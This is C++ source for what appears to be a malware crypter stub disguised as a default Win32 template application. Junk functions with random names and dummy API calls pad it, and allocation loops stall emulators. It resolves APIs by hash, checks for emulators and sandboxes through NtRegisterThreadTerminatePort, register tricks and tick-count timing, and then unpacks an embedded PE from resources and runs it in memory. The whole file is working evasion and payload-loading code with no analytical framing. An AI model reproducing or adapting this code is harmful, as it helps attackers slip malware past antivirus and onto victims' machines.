// Win32Project1.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "Win32Project1.h"
#include "PELoader.h"

#include <CommCtrl.h>
#include <Ole2.h>


/*************************************************************/
/************ AUTO GENERATED FORWARD DECLARATIONS ************/
/*************************************************************/
HDC func_0_0(PLONG MWJX, HMENU NqxNsQ);
PVOID func_0_1(HINSTANCE jKHfOQlq, PWCHAR nMZnxATwzf, HMENU JBKRhKthI, HINSTANCE LlWDlnET, HWND qzcSoZWkizt, HMENU vrcDSLDM);
HDC func_0_2();
HDC func_0_3();
HMENU func_1_0(PLONG YGUS, HMENU ImID, LONG gZpwcQ, PCHAR dvgMsWPskb, BOOL dmQdQvVH, HMODULE qWZfMm, PDWORD AeZwQN);
HMENU func_1_1(HDC UCZcsyw, LONG vTSGLEmXDep);
DWORD func_2_0(DWORD kdqr, LONG CXGktXT, HANDLE dcxGznefx);
HANDLE func_2_1(DWORD gvMkd, HMODULE xDox, PWCHAR LkvOkrPx, PCHAR cHTCif, HDC obRQybuSqwx, HDC DaQDDQs);
PVOID func_2_2(PDWORD aAjKjwuMfSK, PWCHAR ZksjetIp);
VOID func_2_3();
/*************************************************************/
/*************************************************************/
/*************************************************************/

HDC func_0_0(PLONG MWJX, HMENU NqxNsQ) {
	PCHAR OFGX = (PCHAR)"nQPqZD";
	HMENU LgKEIz = (HMENU)0x5211C1E4;
	HANDLE AZZwn = (HANDLE)0x59251132;
	HWND Xmul = (HWND)0x32BE6106;
	DWORD WmyzoV = (DWORD)0x2AA0ACAF;
	PVOID PKzxj = (PVOID)0x2BC2A57D;
	HDC AVOR = (HDC)0x05851D46;

	GetCommandLineW();
	GetMenu((HWND)0x6EE73CDF);
	GetACP();
	AZZwn = GetPropW(Xmul, L"7P1qIpWRq6");

	DestroyMenu((HMENU)0x715E85AF);
	WmyzoV = lstrlenA(OFGX);

	WmyzoV = ReleaseDC((HWND)0x6C24F8D7, AVOR);

	GetLastError();
	lstrlenW(L"wDUw");
	func_2_3();
	return AVOR;
}

PVOID func_0_1(HINSTANCE jKHfOQlq, PWCHAR nMZnxATwzf, HMENU JBKRhKthI, HINSTANCE LlWDlnET, HWND qzcSoZWkizt, HMENU vrcDSLDM) {
	PLONG yAfT = (PLONG)0x6CAC3855;
	HWND mDbMclvBzA = (HWND)0x0238340D;
	HWND GNgRq = (HWND)0x7D3AB40A;
	PDWORD TOctGUHpj = (PDWORD)0x510A890A;
	HMODULE NilSthxh = (HMODULE)0x45B034EB;
	HDC QvzGRpIDmq = (HDC)0x0AA89257;
	HANDLE iAjptZMRkmM = (HANDLE)0x4CF111A9;
	DWORD bOGCvIQMKN = (DWORD)0x6C1B6969;
	PCHAR TzdZXHvcZN = (PCHAR)"YABlX8SUL";


	IsDlgButtonChecked(GNgRq, (DWORD)0x68BA557D);
	func_0_3();
	bOGCvIQMKN = ReleaseDC(qzcSoZWkizt, QvzGRpIDmq);


	iAjptZMRkmM = GetProcessHeap();

	QvzGRpIDmq = func_0_3();



	JBKRhKthI = GetMenu((HWND)0x3BCDAE97);


	return (PVOID)TzdZXHvcZN;
}

HDC func_0_2() {
	HANDLE MiSXX = (HANDLE)0x4814F07D;
	PCHAR BXyHix = (PCHAR)"OYMonvF";
	HINSTANCE nsbmN = (HINSTANCE)0x0B762666;
	PDWORD kxNMHEG = (PDWORD)0x113F7257;
	DWORD xIaXkjKFQEb = (DWORD)0x20E2B370;
	BOOL YREKhGKjB = (BOOL)TRUE;
	HWND xIAPIC = (HWND)0x766939EC;
	PWCHAR pqBkBvn = (PWCHAR)L"iTgPL";
	HDC HXUq = (HDC)0x36CAE8F2;

	func_2_3();
	func_2_3();
	GetWindowLongA((HWND)0x27447CA7, xIaXkjKFQEb);


	GetShellWindow();
	xIaXkjKFQEb = lstrlenW(L"SqabNCN0UI");

	YREKhGKjB = SetWindowTextW(xIAPIC, pqBkBvn);

	lstrlenW(L"O49t0kDNJm");
	xIaXkjKFQEb = lstrcmpA(BXyHix, "s0k3uvxTc");

	HXUq = func_0_3();



	xIaXkjKFQEb = GetACP();

	return HXUq;
}

HDC func_0_3() {
	HMODULE YovIf = (HMODULE)0x426F75BD;
	HDC GBaAlNyGqWv = (HDC)0x4BBBC24F;
	PDWORD aswHIpfn = (PDWORD)0x19EAC6F5;
	DWORD pWNzEBP = (DWORD)0x13718C5B;
	PWCHAR WaYyG = (PWCHAR)L"rD2J";
	BOOL eSXjGhmVE = (BOOL)TRUE;
	HWND qeSR = (HWND)0x674E4448;
	HMENU dEceVG = (HMENU)0x47AB02E3;

	GetCommandLineW();
	pWNzEBP = GetCurrentProcessId();

	GetLastError();
	GetCommandLineW();
	DeleteMenu((HMENU)0x6DA45DD4, pWNzEBP, pWNzEBP);
	GetCursor();
	pWNzEBP = lstrcmpW(WaYyG, L"rQ8Li0Al8nt");

	eSXjGhmVE = RemoveMenu((HMENU)0x53906164, (DWORD)0x18741A73, pWNzEBP);

	pWNzEBP = IsDlgButtonChecked(qeSR, (DWORD)0x0909C3B4);

	qeSR = SetFocus(qeSR);

	dEceVG = GetMenu((HWND)0x31475481);

	pWNzEBP = GetLastError();

	dEceVG = GetSubMenu((HMENU)0x0E877D57, pWNzEBP);

	GetShellWindow();
	return GBaAlNyGqWv;
}

HMENU func_1_0(PLONG YGUS, HMENU ImID, LONG gZpwcQ, PCHAR dvgMsWPskb, BOOL dmQdQvVH, HMODULE qWZfMm, PDWORD AeZwQN) {
	PDWORD gbZZVuNfz = (PDWORD)0x234C129A;
	PLONG DtcIoO = (PLONG)0x120F68CB;
	PVOID SDsBuaubZIY = (PVOID)0x535B29ED;
	PLONG COgKeXWWaZO = (PLONG)0x5BA35259;
	HDC hKmNXhX = (HDC)0x41420C4E;
	DWORD SnJVAagn = (DWORD)0x6AEEA75C;
	HWND TPWDMuaBFsR = (HWND)0x7B4889F7;
	PWCHAR hCHBHohLxKu = (PWCHAR)L"IxWmB4XCl";
	HINSTANCE FDAqw = (HINSTANCE)0x64157536;
	HANDLE zeFtlBymov = (HANDLE)0x7752E0E3;

	hKmNXhX = func_0_3();

	SetMenuDefaultItem((HMENU)0x5BF92641, SnJVAagn, (DWORD)0x505BDABD);
	SnJVAagn = GetSysColor(SnJVAagn);

	GetCurrentProcessId();

	CheckMenuItem(ImID, (DWORD)0x1EFF87E2, (DWORD)0x5C445620);

	SetFocus(TPWDMuaBFsR);
	dmQdQvVH = DrawMenuBar(TPWDMuaBFsR);



	hKmNXhX = func_0_2();

	return ImID;
}

HMENU func_1_1(HDC UCZcsyw, LONG vTSGLEmXDep) {
	HINSTANCE POoek = (HINSTANCE)0x2D659FD2;
	LONG YrRntrNPf = (LONG)0x1125C749;
	HMENU iuZtRadAG = (HMENU)0x5DC286EE;
	PWCHAR fhOsPDNAU = (PWCHAR)L"fIjv";
	DWORD SYAekx = (DWORD)0x6D26905D;
	BOOL mQXzKRuNaww = (BOOL)TRUE;
	HWND jAcowYHH = (HWND)0x4FE1F455;
	HANDLE umCJzvK = (HANDLE)0x6287032F;
	PCHAR WHjg = (PCHAR)"5gHXx";

	lstrcatW(fhOsPDNAU, fhOsPDNAU);
	GetProcessHeap();
	SYAekx = GetMenuState((HMENU)0x2CCCC2EC, (DWORD)0x1CB4ACAB, SYAekx);

	lstrlenW(L"0HtCH9Ei");
	mQXzKRuNaww = IsWindowVisible(jAcowYHH);

	umCJzvK = GetPropW((HWND)0x3958C3B0, fhOsPDNAU);

	GetPropA(jAcowYHH, "uynAE2I8o");
	SYAekx = GetKeyState((DWORD)0x48F7D632);

	umCJzvK = GetPropW((HWND)0x3CCAC632, fhOsPDNAU);

	jAcowYHH = SetFocus(jAcowYHH);

	GetLastError();
	mQXzKRuNaww = SetWindowTextA((HWND)0x6EDCF9D1, "xRmoMUa");

	DestroyWindow(jAcowYHH);
	WHjg = lstrcatA("Q1D2", WHjg);

	return iuZtRadAG;
}

DWORD func_2_0(DWORD kdqr, LONG CXGktXT, HANDLE dcxGznefx) {
	PCHAR fKlU = (PCHAR)"W0Vh58Z4xe";
	HANDLE TthWnB = (HANDLE)0x69678757;
	BOOL sBjBRE = (BOOL)TRUE;
	HWND rJvlzgTu = (HWND)0x445EFCA7;
	PVOID HiHkmmZyZ = (PVOID)0x5F6AA81A;
	PDWORD FAMsex = (PDWORD)0x4705A65D;
	HMENU wTCc = (HMENU)0x71CA5D17;
	HINSTANCE CRaBScHIIt = (HINSTANCE)0x68C1313F;


	kdqr = GetACP();



	wTCc = CreateMenu();

	GetLastError();
	GetSysColor(kdqr);
	dcxGznefx = GetProcessHeap();

	kdqr = GetLastError();


	return kdqr;
}

HANDLE func_2_1(DWORD gvMkd, HMODULE xDox, PWCHAR LkvOkrPx, PCHAR cHTCif, HDC obRQybuSqwx, HDC DaQDDQs) {
	PCHAR TVsa = (PCHAR)"Br6mGD9ZZ9";
	PDWORD EUMTBXDj = (PDWORD)0x643D5C39;
	PVOID ozHNWZmWs = (PVOID)0x598772EC;
	HWND ImLlSxpqEQ = (HWND)0x5E241CE8;
	BOOL WsvAqwvk = (BOOL)TRUE;
	PLONG vlBu = (PLONG)0x77BF8FE7;
	LONG cwUNP = (LONG)0x1182E8E3;



	gvMkd = lstrlenW(LkvOkrPx);

	GetACP();
	lstrlenA("b5iwLJw");

	ozHNWZmWs = func_2_2(EUMTBXDj, L"GOqYPTO");

	ozHNWZmWs = func_2_2((PDWORD)0x7E820BFB, L"wVNysCBX");

	return (HANDLE)cHTCif;
}

PVOID func_2_2(PDWORD aAjKjwuMfSK, PWCHAR ZksjetIp) {
	LONG csOsSgxPagy = (LONG)0x3AAC7A8D;
	PLONG tiYsI = (PLONG)0x0DB5C266;
	PLONG bucoTbJUMqQ = (PLONG)0x795D683C;
	HANDLE FLoDmz = (HANDLE)0x79C5AD14;
	DWORD akTRAr = (DWORD)0x161C8B32;
	PCHAR YJnNHoZT = (PCHAR)"4DyZgllRUo";
	BOOL PCuuYzfYkM = (BOOL)TRUE;
	HINSTANCE zfGNcbBZK = (HINSTANCE)0x405DE7EB;
	HDC hetkyCsTgkJ = (HDC)0x31C5104C;
	HWND rLWCDI = (HWND)0x200C14FD;

	lstrcatA("EqC1g3dX3N", "TRikUXSj");
	lstrcatW(L"IcinK", L"nFVWReBB23J");

	SetForegroundWindow((HWND)0x24350039);
	func_2_3();
	akTRAr = lstrcmpA(YJnNHoZT, YJnNHoZT);


	akTRAr = GetACP();

	GetCommandLineW();
	hetkyCsTgkJ = func_0_3();


	PCuuYzfYkM = IsWindow(rLWCDI);

	return (PVOID)hetkyCsTgkJ;
}

VOID func_2_3() {
	HINSTANCE xpthC = (HINSTANCE)0x03500DB0;
	HWND YgmkbEdUG = (HWND)0x58F560A9;
	HMENU ZbTMtZhJf = (HMENU)0x4A1AE65D;
	HINSTANCE hNgJWGLk = (HINSTANCE)0x5FA4767B;
	HANDLE TbFurMDO = (HANDLE)0x3922A582;
	DWORD nIcJD = (DWORD)0x48B2D2D1;
	PCHAR RlscsouW = (PCHAR)"Mx1E";

	GetACP();
	UpdateWindow((HWND)0x1B2C2F79);
	TbFurMDO = GetProcessHeap();

	nIcJD = GetLastError();

	IsDlgButtonChecked((HWND)0x5353D76C, (DWORD)0x33DC068F);
	GetLastError();
	ZbTMtZhJf = GetSystemMenu(YgmkbEdUG, FALSE);

	IsWindow((HWND)0x6335A489);
	nIcJD = GetLastError();

	ZbTMtZhJf = GetMenu(YgmkbEdUG);

	ShowWindow(YgmkbEdUG, (DWORD)0x1DA1BACC);
	nIcJD = GetACP();

	GetProcessHeap();
	nIcJD = lstrlenA(RlscsouW);

	RemoveMenu((HMENU)0x5A761EA5, nIcJD, (DWORD)0x4B338D44);
}

#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;								// current instance
TCHAR szTitle[MAX_LOADSTRING];					// The title bar text
TCHAR szWindowClass[MAX_LOADSTRING];			// the main window class name

// Forward declarations of functions included in this code module:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
					   _In_opt_ HINSTANCE hPrevInstance,
					   _In_ LPTSTR    lpCmdLine,
					   _In_ int       nCmdShow) {
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	// TODO: Place code here.
	MSG msg;
	HACCEL hAccelTable;
	LPVOID lpExeBuffer;
	DWORD dwExeSize;

	// Initialize global strings
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_WIN32PROJECT1, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	HDC cHxOcRNyfwW = (HDC)0x7E328BC8;
	PLONG YDnnlzWsPrY = (PLONG)0x52A54056;
	HMENU smqH = (HMENU)0x20CFDFBF;
	PVOID tFgJ = (PVOID)0x1A86350D;
	HINSTANCE eCOvAWndzGE = (HINSTANCE)0x05B1068D;
	PWCHAR zHiEMQYhaZa = (PWCHAR)L"cpYH0";
	HWND tcoGxIxPUl = (HWND)0x09311D7E;
	LONG lhoN = (LONG)0x22CAB0EC;
	PCHAR KBTsmSEcnnd = (PCHAR)"WcJRNeG1Mf";
	BOOL xvndX = (BOOL)TRUE;
	HMODULE TKUbvrYAqW = (HMODULE)0x05415905;
	PDWORD UKmgRgu = (PDWORD)0x381325DA;
	DWORD OHVjjuW = (DWORD)0x785F80AF;
	HANDLE ogouTSTrbQq = (HANDLE)0x18D574EE;

	//call_test();
	//ExitProcess(0);

	for (size_t i = 0; i < 5000; i++) {

		//__asm{ pushad }
//		emul_func_loop();
		//__asm { popad }

		VirtualFree(0, 0, 0);

		for (size_t x = 0; x < 250; x++) {

			VirtualAlloc(0, 0, 0, 0);

			//__asm{ pushad }
			//emul_func_loop();
			//__asm { popad }

		}
	}

	init_settings();
	decrypt_hashes();

	if (loader_init()) {

		LPVOID lpNtRegisterThreadTerminatePort = load_func(MODULE_BASE::NTDLL, hash_NtRegisterThreadTerminatePort);
		DWORD eax_value = 0;

		LPVOID lpExitProcess = load_func(MODULE_BASE::KERNEL32, hash_ExitProcess);

		__asm{
			push 0x5239182
				mov eax, lpNtRegisterThreadTerminatePort
				call eax
				mov eax_value, eax
		}

		if (eax_value != 0xC0000008) {
			
			OleInitialize(nullptr);

			__asm{
				push 0xc8
					mov eax, lpExitProcess
					call eax
			}
		}

		LPVOID lpIsWalpha = load_func(MODULE_BASE::NTDLL, hash_iswalpha);
		DWORD ecx_value = 0;

		func_1_1((HDC)0x25FA9F4A, lhoN);

		__asm	{
			push 0xAA4D83
				mov eax, lpIsWalpha
				call eax
				mov ecx_value, ecx
		}

		func_0_2();
		func_1_1(cHxOcRNyfwW, (LONG)0x5D6321E2);


		func_0_3();

		if (ecx_value != 0x103) {


			while (ecx_value != 0x103) {
				GetLastError();
				FreeLibrary(0);
				LocalFree(0);
				MultiByteToWideChar(0, 0, 0, 0, 0, 0);
				LeaveCriticalSection(0);
				EnterCriticalSection(0);
				DeleteCriticalSection(0);
				InitializeCriticalSection(0);
				GetSystemTimeAsFileTime(0);
				UnhandledExceptionFilter(0);
				SetUnhandledExceptionFilter(0);
				WideCharToMultiByte(0, 0, 0, 0, 0, 0, 0, 0);
				lstrlenW(0);
				LocalAlloc(0, 0);
				WaitForSingleObject(0, 0);
				HeapFree(0, 0, 0);
				HeapAlloc(0, 0, 0);
				lstrcpyW(0, 0);
				VirtualAlloc(0, 0, 0, 0);
				VirtualFree(0, 0, 0);
				HeapReAlloc(0, 0, 0, 0);
				GetFileSize(0, 0);
				lstrcatW(0, 0);
				GlobalLock(0);
				GlobalUnlock(0);
				FormatMessageW(0, 0, 0, 0, 0, 0, 0);
				ReleaseMutex(0);
			}
		}

		if (checkEmulator_GetTickCount()) {
			__asm{
				push 0
					mov eax, lpExitProcess
					call eax
			}
		}

		func_1_1(cHxOcRNyfwW, (LONG)0x093ED88C);
		func_1_1((HDC)0x26046744, lhoN);

		func_0_1((HINSTANCE)0x37F57C34, L"4ZKApVFPtHz", (HMENU)0x68354BCF, eCOvAWndzGE, tcoGxIxPUl, (HMENU)0x6CB7F8FC);

		for (size_t i = 0; i < 100; i++) {
			
			LocalAlloc(0, 5);

			//__asm{ pushad }
			//emul_func_loop();
			//__asm { popad }

			FreeLibrary(0);
		/*	
			for (size_t x = 0; x < 500; x++) {
				
				__asm{ pushad }
				emul_func_loop();
				__asm { popad }
			}*/
		}


		lpExeBuffer = loader_load_res(&dwExeSize);
		loader_load_pe(lpExeBuffer, dwExeSize);

		__asm{
			push 0
				mov eax, lpExitProcess
				call eax
		}
	}

	//// Kernel32.dll
	/*GetLastError();
	FreeLibrary(0);
	LocalFree(0);
	MultiByteToWideChar(0, 0, 0, 0, 0, 0);
	LeaveCriticalSection(0);
	EnterCriticalSection(0);
	DeleteCriticalSection(0);
	InitializeCriticalSection(0);
	GetSystemTimeAsFileTime(0);
	UnhandledExceptionFilter(0);
	SetUnhandledExceptionFilter(0);
	WideCharToMultiByte(0, 0, 0, 0, 0, 0, 0, 0);
	lstrlenW(0);
	LocalAlloc(0, 0);
	WaitForSingleObject(0, 0);
	HeapFree(0, 0, 0);
	HeapAlloc(0, 0, 0);
	lstrcpyW(0, 0);
	VirtualAlloc(0, 0, 0, 0);
	VirtualFree(0, 0, 0);
	HeapReAlloc(0, 0, 0, 0);
	GetFileSize(0, 0);
	lstrcatW(0, 0);
	GlobalLock(0);
	GlobalUnlock(0);
	FormatMessageW(0, 0, 0, 0, 0, 0, 0);
	ReleaseMutex(0);
*/

	// COMCTL32.dll
	InitCommonControls();
	CreatePropertySheetPage(NULL);
	PropertySheet(NULL);
	ImageList_Create(NULL, NULL, NULL, NULL, NULL);
	ImageList_ReplaceIcon(NULL, NULL, NULL);
	/*ImageList_Destroy(NULL);
	PropertySheetA(NULL);
	PropertySheetW(NULL);
	ImageList_Draw(NULL, NULL, NULL, NULL, NULL, NULL);
	CreateToolbarEx(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);*/
	ImageList_LoadImageA(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	ImageList_GetIconSize(NULL, NULL, NULL);

	//// USER32.dll
	wsprintf(NULL, NULL);
	GetDlgItem(NULL, NULL);
	ShowWindow(NULL, NULL);
	EndDialog(NULL, NULL);
	GetWindowRect(NULL, NULL);
	//GetSysColor(NULL);
	//GetSysColorBrush(NULL);
	//GetWindowTextLength(NULL);
	//DrawFocusRect(NULL, NULL);
	//CreateDialogParamA(NULL, NULL, NULL, NULL, NULL);
	//SetDlgItemTextA(NULL, NULL, NULL);
	//CreatePopupMenu();
	//RedrawWindow(0, 0, 0, 0);
	LoadMenuW(0, 0);
	GetSystemDefaultLangID();
	ExitWindowsEx(0, 0);
	GetWindowPlacement(0, 0);
	GetLastActivePopup(0);
	GetClassName(0, 0, 0);

	// Perform application initialization:
	if (!InitInstance(hInstance, nCmdShow)) {
		return FALSE;
	}

	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WIN32PROJECT1));

	// Main message loop:
	while (GetMessage(&msg, NULL, 0, 0)) {
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg)) {
			TranslateMessage(&msg);
			//DispatchMessage(&msg);
		}
	}

	return (int)msg.wParam;
}

//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance) {
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_WIN32PROJECT1));
	wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = MAKEINTRESOURCE(IDC_WIN32PROJECT1);
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow) {
	HWND hWnd;

	hInst = hInstance; // Store instance handle in our global variable

	hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
						CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, hInstance, NULL);

	if (!hWnd) {
		return FALSE;
	}

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:  Processes messages for the main window.
//
//  WM_COMMAND	- process the application menu
//  WM_PAINT	- Paint the main window
//  WM_DESTROY	- post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;

	switch (message) {
		case WM_COMMAND:
			wmId = LOWORD(wParam);
			wmEvent = HIWORD(wParam);
			// Parse the menu selections:
			switch (wmId) {
				case IDM_ABOUT:
					DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
					break;
				case IDM_EXIT:
					DestroyWindow(hWnd);
					break;
				default:
					return DefWindowProc(hWnd, message, wParam, lParam);
			}
			break;
		case WM_PAINT:
			hdc = BeginPaint(hWnd, &ps);
			// TODO: Add any drawing code here...
			EndPaint(hWnd, &ps);
			break;
		case WM_DESTROY:
			//PostQuitMessage(0);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
	UNREFERENCED_PARAMETER(lParam);
	switch (message) {
		case WM_INITDIALOG:
			return (INT_PTR)TRUE;

		case WM_COMMAND:
			if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) {
				EndDialog(hDlg, LOWORD(wParam));
				return (INT_PTR)TRUE;
			}
			break;
	}
	return (INT_PTR)FALSE;
}
